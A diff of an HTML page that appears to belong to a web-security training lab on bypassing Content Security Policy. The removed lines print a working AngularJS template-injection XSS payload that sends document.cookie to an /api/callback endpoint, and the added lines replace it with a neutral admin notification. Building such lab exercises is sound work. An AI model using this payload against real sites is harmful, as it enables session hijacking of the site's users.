@@ -14,19 +14,17 @@
             </div>
 
             <div class="bg-white/10 backdrop-blur-md rounded-lg p-8">
-                <h2 class="text-2xl font-bold mb-4">CSP Bypass Exploitation Scenario</h2>
+                <h2 class="text-2xl font-bold mb-4">Admin Dashboard</h2>
                 <p class="text-white/80 mb-4">
-                    You are the <strong>admin</strong>. An attacker has sent you a malicious search link.
+                    Welcome, <strong>Administrator</strong>. You have an unread notification.
                 </p>
 
                 <div class="bg-black/30 rounded-lg p-6 mb-4">
-                    <p class="text-sm font-semibold mb-3">Try this payload:</p>
-                    <div class="text-xs font-mono bg-black/40 p-3 rounded break-all">
-                        <a href="/search?q=<div ng-app ng-csp>{{constructor.constructor('fetch(\"/api/callback?session=\"%2Bdocument.cookie)')()}}</div>"
-                           class="text-blue-400">
-                            /search?q=&lt;div ng-app ng-csp&gt;{{...}}&lt;/div&gt;
-                        </a>
-                    </div>
+                    <p class="text-sm font-semibold mb-3">Unread message:</p>
+                    <p class="text-white/70 text-sm">
+                        A colleague shared a product search link with you.
+                        Click <a href="/search?q=new+arrivals" class="text-blue-400 underline">here</a> to view.
+                    </p>
                 </div>
             </div>
         </div>
